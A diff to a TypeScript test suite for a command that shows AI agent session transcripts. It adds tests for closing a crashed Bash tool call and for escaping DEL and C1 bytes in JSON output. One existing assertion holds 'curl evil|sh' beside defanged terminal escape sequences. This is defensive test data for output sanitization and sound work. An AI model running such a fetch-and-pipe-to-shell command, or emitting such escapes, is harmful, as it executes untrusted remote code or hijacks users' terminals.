@@ -58,7 +58,7 @@ interface Relay {
   close(): void;
 }
 
-function startRelay(opts: { running: boolean }): Relay {
+function startRelay(opts: { running: boolean; extra?: object[] }): Relay {
   const wss = new WebSocketServer({ port: 0 });
   let socket: WebSocket | null = null;
   const send = (ws: WebSocket, frame: object) =>
@@ -100,6 +100,16 @@ function startRelay(opts: { running: boolean }): Relay {
             "2026-10-29T08:07:05.000Z",
             token,
           ),
+          ...(opts.extra ?? []).map((params) => ({
+            ...params,
+            _meta: {
+              platform: {
+                ...(params as { _meta?: { platform?: object } })._meta
+                  ?.platform,
+                replayFor: token,
+              },
+            },
+          })),
         ];
         for (const params of replay)
           send(ws, { method: "session/update", params });
@@ -409,5 +419,69 @@ describe("dam session show", () => {
 
     expect(out.stdout).not.toMatch(/[\u001b\u0007]/);
     expect(out.stdout).toContain("curl evil|sh [2K [1Ahello ]52;c;Zm9v");
+  });
+
+  /**
+   * TEST_SCENARIO: The agent went down during a Bash call two days ago, so
+   * the transcript holds the call with no closing update and no turn end, and
+   * no turn runs now. The load must close the call with an end time, and the
+   * line must not count its duration as still going.
+   */
+  it("should close a call an idle load finds open, with an end time", async () => {
+    relay = startRelay({
+      running: false,
+      extra: [
+        update(
+          "tool_call",
+          {
+            toolCallId: "t5",
+            title: "x",
+            status: "in_progress",
+            rawInput: { command: "mise run e2e" },
+            _meta: { claudeCode: { toolName: "Bash" } },
+          },
+          "2026-10-27T09:10:00.000Z",
+        ),
+      ],
+    });
+    expect(await dam([SESSION])).toBe(0);
+    expect(out.stdout).toContain(
+      "09:10:00  tool   Bash [failed, -] mise run e2e",
+    );
+    expect(out.stdout).not.toContain("so far");
+
+    out.stdout = "";
+    expect(await dam([SESSION, "--json"])).toBe(0);
+    const shown = JSON.parse(out.stdout) as { steps: object[] };
+    expect(shown.steps.at(-1)).toMatchObject({
+      status: "failed",
+      endedAt: new Date(NOW).toISOString(),
+      durationMs: null,
+    });
+  });
+
+  /**
+   * TEST_SCENARIO: The `--json` output carries session text with DEL and a C1
+   * control byte (0x9b, a one-byte escape sequence on some terminals).
+   * `JSON.stringify` leaves both raw, so the command must escape them, and
+   * the line must still parse back to the same text.
+   */
+  it("should escape DEL and C1 bytes in its JSON output", async () => {
+    const text = "erase\u009b2K\u007fdone";
+    relay = startRelay({
+      running: false,
+      extra: [
+        update(
+          "agent_message_chunk",
+          { content: { type: "text", text }, messageId: "a5" },
+          "2026-10-29T08:30:00.000Z",
+        ),
+      ],
+    });
+    expect(await dam([SESSION, "--json"])).toBe(0);
+    expect(out.stdout).not.toMatch(/[\u007f-\u009f]/);
+    expect(out.stdout).toContain("\\u009b2K\\u007f");
+    const shown = JSON.parse(out.stdout) as { steps: { text?: string }[] };
+    expect(shown.steps.at(-1)?.text).toBe(text);
   });
 });
